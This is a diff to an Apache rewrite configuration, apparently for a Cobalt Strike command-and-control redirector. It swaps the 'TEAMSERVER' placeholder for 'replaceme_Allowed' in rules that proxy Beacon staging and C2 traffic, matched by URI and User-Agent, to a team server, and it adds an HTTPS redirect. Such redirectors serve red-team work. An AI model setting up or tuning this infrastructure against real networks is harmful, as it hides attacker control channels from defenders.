@@ -7,6 +7,10 @@
       	RewriteOptions Inherit
       	ServerSignature Off
 	
+	#Forcing HTTPS
+	#RewriteCond %{HTTPS} !=on [NC]
+	#RewriteRule ^.*$ https://replaceme%{REQUEST_URI} [L,R=301]
+	
 	## Uncomment to enable verbose debugging in /var/logs/apache2/error.log
 	# LogLevel alert rewrite:trace5
 	
@@ -63,12 +67,12 @@
 	## Uncomment and adjust as needed
 	#RewriteCond %{REQUEST_URI} ^/{URI GOES HERE}?$
 	#RewriteCond %{HTTP_USER_AGENT} ^$
-	#RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
+	#RewriteRule ^.*$ "http://replaceme_Allowed%{REQUEST_URI}" [P,L]
 
 	## Default Beacon Staging Support (/1234)
 	RewriteCond %{REQUEST_URI} ^/..../?$
 	RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
-	RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
+	RewriteRule ^.*$ "http://replaceme_Allowed%{REQUEST_URI}" [P,L]
 
 	## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
 	## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
@@ -78,4 +82,4 @@
 	RewriteCond %{REQUEST_URI} ^(/{URI GOES HERE}.*|/{AND OTHER URI GOES HERE}.*|/{AND OTHER URI GOES HERE}.*)$
 	## Profile UserAgent
 	RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
-	RewriteRule ^.*$ "https://TEAMSERVER%{REQUEST_URI}" [P,L]
+	RewriteRule ^.*$ "https://replaceme_Allowed%{REQUEST_URI}" [P,L]
